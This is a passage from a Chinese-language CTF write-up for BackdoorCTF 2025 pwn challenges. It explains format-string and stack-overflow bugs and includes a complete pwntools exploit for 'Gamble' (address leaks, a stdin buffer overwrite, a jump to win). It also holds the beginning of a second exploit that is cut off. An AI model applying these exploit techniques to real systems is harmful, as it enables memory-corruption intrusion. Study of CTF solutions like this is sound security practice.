</span></span></code></pre></div><h2 id=gamble>Gamble<a hidden class=anchor aria-hidden=true href=#gamble>#</a></h2><p>存在可多次触发的格式化字符串漏洞，<code>printf</code>里只能写6个字节，但是可以通过前面的10个字节放地址，printf里放<code>%9$hhn</code>来往任意地址写入<code>b'\x00</code>。因为可以多次触发，所以也可以泄露出libc地址，栈地址，程序基地址等。</p><p><img alt=image-20251208164111639 loading=lazy src=/posts/ctf/backdoorctf2025-writeup/assets/image-20251208164111639.png></p><p>既然有任意地址写<code>b'\x00'</code>那么就可以想到，写<code>stdin</code>的<code>_IO_buf_base</code>的最低字节，由此实现任意地址写。</p><p><strong>值得注意的是，利用这种办法任意地址写时，最好把第二次覆盖<code>stdin</code>的<code>ptr</code>和<code>end</code>写“宽”一点，比如<code>payload = b'a' * 0x18 + p64(targetaddr - 0x8) + p64(targetaddr + 0x20) + p64(0) * 4</code>，否则会在写入已经想要的东西后，还没<code>ret</code>，但是再次触发写入覆盖</strong></p><p>程序还有一个<code>win</code>函数，会输出flag，在栈上把返回地址写为<code>win</code>函数地址即可。</p><p><img alt=image-20251208164621023 loading=lazy src=/posts/ctf/backdoorctf2025-writeup/assets/image-20251208164621023.png></p><p>感觉这题这种解法不是预期解，等一下官方的WriteUp</p><p>exp</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwncli</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;, &#39;-n&#39;, &#39;debug&#39;]</span>
</span></span><span class=line><span class=cl><span class=n>filename</span> <span class=o>=</span> <span class=s2>&#34;chal&#34;</span>
</span></span><span class=line><span class=cl><span class=n>libcname</span> <span class=o>=</span> <span class=s2>&#34;/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;remote.infoseciitr.in&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>8004</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>libcname</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>libcname</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug
</span></span></span><span class=line><span class=cl><span class=s1>set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sa</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sla</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ============================= 漏洞利用函数 =============================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>vuln1_integer_overflow_login</span><span class=p>(</span><span class=n>user_id</span><span class=p>,</span> <span class=n>username</span><span class=p>,</span> <span class=n>target_balance</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    漏洞 #1: 整数溢出 - 在 login 函数中控制余额
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    原理:
</span></span></span><span class=line><span class=cl><span class=s2>        - login 函数计算: balance += 8 * user_input
</span></span></span><span class=line><span class=cl><span class=s2>        - 通过精心选择 user_input，可以让余额变成任意值
</span></span></span><span class=line><span class=cl><span class=s2>        - 甚至可以设置为负数或特定地址
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    利用:
</span></span></span><span class=line><span class=cl><span class=s2>        - 设置余额为任意值（包括地址，用于后续任意写零）
</span></span></span><span class=line><span class=cl><span class=s2>        - 输入负数可以减少余额
</span></span></span><span class=line><span class=cl><span class=s2>        - 输入超大值可能导致溢出
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    Args:
</span></span></span><span class=line><span class=cl><span class=s2>        user_id: 用户 ID (0-9)
</span></span></span><span class=line><span class=cl><span class=s2>        username: 用户名
</span></span></span><span class=line><span class=cl><span class=s2>        target_balance: 目标余额（将会乘以8后加到余额上）
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    返回:
</span></span></span><span class=line><span class=cl><span class=s2>        实际设置的余额 = target_balance * 8
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[VULN #1] Integer Overflow: Setting user </span><span class=si>{</span><span class=n>user_id</span><span class=si>}</span><span class=s2> balance to </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>target_balance</span> <span class=o>*</span> <span class=mi>8</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 选择菜单选项 [1] Login</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 输入用户 ID</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Enter your user ID (0-9): &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>user_id</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 首次登录，输入用户名</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Please enter your name: &#34;</span><span class=p>,</span> <span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 输入金额（将会乘以 8）</span>
</span></span><span class=line><span class=cl>    <span class=c1># 注意：如果 target_balance 是负数或很大，会触发整数溢出</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Enter amount of coins you want: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>target_balance</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>actual_balance</span> <span class=o>=</span> <span class=n>target_balance</span> <span class=o>*</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;User </span><span class=si>{</span><span class=n>user_id</span><span class=si>}</span><span class=s2> balance set to: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>actual_balance</span><span class=p>)</span> <span class=k>if</span> <span class=n>actual_balance</span> <span class=o>&gt;=</span> <span class=mi>0</span> <span class=k>else</span> <span class=n>actual_balance</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>actual_balance</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>vuln2_format_string_leak</span><span class=p>(</span><span class=n>user_id</span><span class=p>,</span> <span class=n>fmt_payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    漏洞 #2: 格式化字符串 - 在 bet 函数中泄露栈/libc/PIE地址
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    原理:
</span></span></span><span class=line><span class=cl><span class=s2>        - bet 函数允许输入 16 字节，但 buffer 只有 10 字节
</span></span></span><span class=line><span class=cl><span class=s2>        - 字节 10-15 会溢出覆盖 format 变量
</span></span></span><span class=line><span class=cl><span class=s2>        - 随后 printf(format) 将用户控制的格式字符串执行
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    利用:
</span></span></span><span class=line><span class=cl><span class=s2>        - 泄露栈地址: %p 或 %&lt;offset&gt;$p
</span></span></span><span class=line><span class=cl><span class=s2>        - 泄露 libc: %&lt;offset&gt;$s (需要知道栈上有 libc 指针)
</span></span></span><span class=line><span class=cl><span class=s2>        - 任意地址读: 构造特殊 payload
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    Args:
</span></span></span><span class=line><span class=cl><span class=s2>        user_id: 用户 ID (0-9)
</span></span></span><span class=line><span class=cl><span class=s2>        offset: 格式化字符串偏移 (用于 %&lt;offset&gt;$p)
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    返回:
</span></span></span><span class=line><span class=cl><span class=s2>        泄露的地址 (8 字节)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 选择菜单选项 [2] Place Bet</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 输入用户 ID</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Plese enter id to place bet: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>user_id</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 发送 payload（注意：不要发送换行符，用 send 而不是 sendline）</span>
</span></span><span class=line><span class=cl>    <span class=c1>#sh.interactive()</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Enter your bet amount (Please specify Currency): &#34;</span><span class=p>,</span> <span class=n>fmt_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 接收格式化字符串输出</span>
</span></span><span class=line><span class=cl>    <span class=n>leaked</span> <span class=o>=</span> <span class=n>sh</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Format string output: </span><span class=si>{</span><span class=n>leaked</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 解析地址</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>leaked</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;0x&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>leaked_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>leaked</span><span class=p>[:</span><span class=mi>14</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>leaked_addr</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>warning</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Failed to parse leaked address: </span><span class=si>{</span><span class=n>leaked</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;DEMO 2: Format String Vulnerability - Leak Addresses&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>vuln1_integer_overflow_login</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;pwner&#34;</span><span class=p>,</span> <span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>vuln1_integer_overflow_login</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;pwner&#34;</span><span class=p>,</span> <span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>vuln1_integer_overflow_login</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;pwner&#34;</span><span class=p>,</span> <span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>vuln1_integer_overflow_login</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;pwner&#34;</span><span class=p>,</span> <span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>leaked</span> <span class=o>=</span> <span class=n>vuln2_format_string_leak</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>10</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;%33$p&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>leaked</span> <span class=o>-</span> <span class=mh>0x2a1ca</span>
</span></span><span class=line><span class=cl><span class=n>_IO_2_1_stdin_</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x2038e0</span>
</span></span><span class=line><span class=cl><span class=n>leaked</span> <span class=o>=</span> <span class=n>vuln2_format_string_leak</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>10</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;%28$p&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>leaked</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>targetaddr</span> <span class=o>=</span> <span class=n>leaked</span> <span class=o>-</span> <span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>leaked</span> <span class=o>=</span> <span class=n>vuln2_format_string_leak</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>10</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;%29$p&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pie</span> <span class=o>=</span> <span class=n>leaked</span> <span class=o>-</span> <span class=mh>0x1ec7</span>
</span></span><span class=line><span class=cl><span class=n>leaked</span> <span class=o>=</span> <span class=n>vuln2_format_string_leak</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>_IO_2_1_stdin_</span> <span class=o>+</span> <span class=mh>0x38</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;%9$hhn&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s2>&#34;ID (0-9): &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mi>9</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>targetaddr</span> <span class=o>-</span> <span class=mh>0x8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>targetaddr</span> <span class=o>+</span> <span class=mh>0x20</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s2>&#34;name: &#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s2>&#34;ID (0-9): &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>win_addr</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>targetaddr</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pie</span> <span class=o>+</span> <span class=mh>0x16F1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>targetaddr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s2>&#34;name: &#34;</span><span class=p>,</span> <span class=n>win_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s2>&#34;want: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mi>10</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h2 id=aladdin-ka-chirag>Aladdin ka Chirag<a hidden class=anchor aria-hidden=true href=#aladdin-ka-chirag>#</a></h2><p>格式化字符串漏洞</p><p><img alt=image-20251208165058954 loading=lazy src=/posts/ctf/backdoorctf2025-writeup/assets/image-20251208165058954.png></p><p>虽然<code>printf</code>里看似参数只能塞大小为8的<code>buf</code>，但是注意到<code>s</code>在<code>buf</code>的高地址处，并且<code>buf</code>读入后没有补<code>\x00</code>，所以其实<code>printf</code>的参数可以塞大小为16的<code>buf</code></p><p><img alt=image-20251208165254422 loading=lazy src=/posts/ctf/backdoorctf2025-writeup/assets/image-20251208165254422.png></p><p>仔细看11行的<code>read</code>，会发现还有一个栈溢出，溢出0xa字节，可以把<code>rbp</code>覆盖，再覆盖返回地址的一部分，可以选择覆盖最低字节到</p><p><img alt=image-20251208165349352 loading=lazy src=/posts/ctf/backdoorctf2025-writeup/assets/image-20251208165349352.png></p><p>这样可以<strong>无限触发格式化字符串漏洞</strong>，并且有16字节的空间，可以实现任意写。</p><p>将栈上的<code>libc_start_main_ret</code>写一串<code>ROP</code>开<code>shell</code>即可。</p><p><strong>Q：栈溢出为什么要写返回地址到<code>call cave</code>而不是<code>main</code>或者<code>cave</code>的起始地址？</strong></p><p><strong>A：因为修改到<code>main</code>或<code>cave</code>，堆栈就不平衡了，之后不会返回到<code>libc_start_main_ret</code>，当然应该还有其他解法，不一定要ROP，只是我更喜欢这种</strong></p><p>exp</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwncli</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;, &#39;-n&#39;, &#39;debug&#39; ]</span>
</span></span><span class=line><span class=cl><span class=n>filename</span> <span class=o>=</span> <span class=s2>&#34;chall&#34;</span> <span class=o>+</span> <span class=s2>&#34;_patched&#34;</span>
</span></span><span class=line><span class=cl><span class=n>libcname</span> <span class=o>=</span> <span class=s2>&#34;/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;remote.infoseciitr.in&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>8007</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>libcname</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>libcname</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#b *$rebase(0x13AA)</span>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>b *$rebase(0x138B)
</span></span></span><span class=line><span class=cl><span class=s1>set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug
</span></span></span><span class=line><span class=cl><span class=s1>set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sa</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sla</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span> <span class=o>=</span> <span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>format_write</span><span class=p>(</span><span class=n>addr</span><span class=p>,</span> <span class=n>byte</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;%8$hhnAA&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xcd</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s2>&#34;Enter your name &gt;&gt; &#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
